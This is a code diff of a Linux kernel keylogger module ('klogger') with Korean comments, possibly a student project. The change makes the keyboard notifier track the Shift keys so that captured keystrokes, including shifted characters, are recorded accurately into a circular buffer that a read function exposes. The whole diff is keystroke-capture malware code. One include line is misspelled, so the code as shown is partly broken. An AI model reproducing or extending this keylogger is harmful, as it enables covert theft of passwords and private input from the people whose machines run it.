@@ -1,13 +1,12 @@
 /* Necessary includes for device drivers */
-
 #include <linux/kernel.h>
 #include <asm/uaccess.h>
 #include <semaplhore.h>
 
 #include "klogger.h"
 
-struct semaphore s;
-static int shiftPressed = 0;
+
+static int shiftkey_On = 0;
 
 int klg_init(void) {
 	int result;
@@ -87,23 +86,38 @@ ssize_t klg_read(struct file *filp, char __user *buf, size_t count, loff_t *f_po
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* _param) {
 	struct keyboard_notifier_param *param = _param; //사용자가 입력한 문자를 저장함
 
-	if (code == KBD_KEYCODE && param->down) {
-		if (param->value == KEY_BACKSPACE) { //백스페이스일 때
-			if (bptr != buffer) {
-				--bptr;
-				*bptr = '\0'; //bptr에 저장
-			}
+	if (code == KBD_KEYCODE)
+	{
+		if (param->value == 42 || param->value == 54)
+		{
+			if(param->down) shiftkey_On = 1;
+			else shiftkey_On = 0;
+			return NOTIFY_OK;
 		}
-		else { //백스페이스 아닐 때
-			char ch = get_ascii(param->value); //아스키코드로 변환
-			if (ch != 'X') { //X아니면
-				*bptr = ch; //bptr에 저장하고
-				bptr++; //주소1증가
-				if (bptr == endptr) bptr = buffer; //처음으로 초기화하는건가
+		if (param->down)
+		{
+			if (param->value == KEY_BACKSPACE)  //백스페이스일 때
+			{
+				if (bptr != buffer) { 
+					--bptr;
+					*bptr = '\0';  //bptr에 저장
+				}
+			}
+			else 
+			{
+				char ch;
+				if (shiftkey_On == 0)
+					ch = get_ascii(param->value); //아스키코드로 변환
+				else
+					ch = shifted_get_ascii(param->value);  //shift 아스키코드로 변환
+				if (ch != 'X') {  //X아니면
+					*bptr = ch;  //bptr에 저장하고
+					bptr++;  //주소1증가
+					if (bptr == endptr) bptr = buffer;  //처음으로 초기화하는건가
+				}
 			}
 		}
 	}
-
 	return NOTIFY_OK;
 }
 
